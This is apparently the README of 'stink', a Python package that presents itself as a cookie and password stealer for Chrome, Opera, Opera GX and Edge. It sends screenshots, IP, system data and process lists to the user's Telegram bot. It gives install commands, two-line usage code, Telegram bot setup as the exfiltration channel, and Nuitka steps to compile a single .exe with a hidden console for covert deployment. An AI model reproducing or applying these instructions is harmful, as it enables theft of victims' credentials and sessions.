<img alt="PyPI - Python Version" src="https://img.shields.io/pypi/pyversions/stink">
<img alt="GitHub" src="https://img.shields.io/github/license/FallenAstaroth/stink">
<img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/FallenAstaroth/stink">

# stink

Стиллер куки и паролей всего лишь в 2 строки. Отправка в Telegram.

## Описание
`stink` в данный момент только начинает своё развитие. В будущем его функционал будет расширен.

## Навигация
* [Текущие возможности](#Текущие-возможности)
* [Будущие возможности](#Будущие-возможности)
* [Установка](#Установка)
* [Пример использования](#Пример-использования)
  * [Стандартный](#Стандартный)
  * [Дополнительные параметры](#Дополнительные-параметры)
* [Настройка Telegram бота](#Настройка-Telegram-бота)
  * [Получение токена](#Получение-токена)
  * [Получение айди](#Получение-айди)
* [Создание exe](#Создание-exe)
  * [Создание исполняемого файла](#Создание-исполняемого-файла)
  * [CMD](#CMD)

### Текущие возможности
1. Сбор куки и паролей следующих браузеров:
   - Chrome
   - Opera
   - Opera GX
   - Microsoft Edge
2. Скриншот.
3. Сбор айпи адреса.
4. Сбор конфигурации системы.
5. Сбор активных процессов.
6. Отправка собранных данных архивом в Telegram.
7. Выполнение в отдельном потоке.

### Будущие возможности
1. Поддержка других браузеров.
2. Прочие функции.
 
## Установка

Установить последнюю версию можно командой:
```
pip install stink==0.0.9
```

## Пример использования
### Стандартный
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Дополнительные параметры

`errors` - вывод ошибок.

`passwords` - сбор паролей.

`cookies` - сбор куки.

`processes` - сбор активных процессов.

`system` - сбор конфигурации системы.

`screen` - скриншот.

Все параметры принимают значение `bool`. 

`True` - функция включена.

`False` - функция выключена.

По умолчанию все функции включены.

## Настройка Telegram бота
### Получение токена
1. Открываем чат с [BotFather](https://t.me/botfather).
2. Прописываем команду ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Прописываем название бота, затем ник с прикладкой ```_bot``` в конце.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Полученный токен вставляем в поле ```"YOUR_TOKEN"``` в скрипте.

### Получение айди
1. Открываем чат с [Get My ID](https://t.me/getmyid_bot).
2. Прописываем команду ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Полученный айди вставляем в поле ```YOUR_ID``` в скрипте.

## Создание exe
Python является интерпретируемым языком программирования, поэтому мы сначала транслируем его в C++, а затем скомпилируем в .exe файл.
Для этого нам понадобится Nuitka.

### Создание исполняемого файла

Создаем test.py (либо любое другое название) файл со следующим кодом:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Открываем `cmd`.
2. Прописываем команду:
```
pip install virtualenv
```
3. Переходим в папку с файлом `test.py`:
```
cd path\to\file
```
4. Создаем виртуальное окружение и активируем его:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Устанавливаем Nuitka и Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==0.0.9
```
6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`.
7. Копируем файл `win32crypt.pyd`.
8. Вставляем по пути `\Lib\site-packages\`.
9. Возвращаемся к `cmd` и прописываем команду:
```
nuitka --onefile --windows-disable-console --include-package=stink test.py
```

После выполнения команды получаем test.exe файл со скрытой консолью.
